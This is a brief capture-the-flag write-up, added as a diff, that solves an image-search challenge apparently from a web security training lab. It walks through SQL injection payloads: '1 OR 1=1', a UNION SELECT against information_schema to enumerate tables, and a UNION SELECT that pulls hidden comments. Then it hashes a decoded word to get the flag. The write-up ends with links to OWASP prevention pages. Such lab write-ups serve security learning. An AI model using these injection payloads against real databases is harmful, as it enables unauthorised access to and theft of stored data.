@@ -1,0 +1,33 @@
+First, try the most basic SQL Injection there is:
+    1 OR 1=1
+And immediately you get the results that shows it works. Meaning that the server
+uses straight SQL quiries in it's code and at the end has WHERE id=<user_input>
+
+Among the info from our first query there is a clue:
+    Title: Hack me ?
+    Url : borntosec.ddns.net/images.png
+
+In a clue you have another clue 'images.png' that hints you to look for images table
+in the database. After trying different SELECTs with wildecard (*) and different number
+of parameters you find that the hack only works with 2.
+
+So, now it's time to find images table and columns for it:
+    1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
+At the end you find 'list_images' table with the following columns:
+    id
+    url
+    title
+    comment
+
+After trying them all you find that the one you're looking for is 'comment',
+but since the hack only works when there are 2 selected,
+so you should include any other column, ex. 'title':
+    1 UNION SELECT comment, title FROM list_images
+By following the comment's instructions you get the flag.
+    `md5 decode` gets you "albatroz"
+    `echo -n "albatroz" | shasum -a 256` gets you the flag
+
+FIX
+
+https://owasp.org/www-community/attacks/SQL_Injection
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
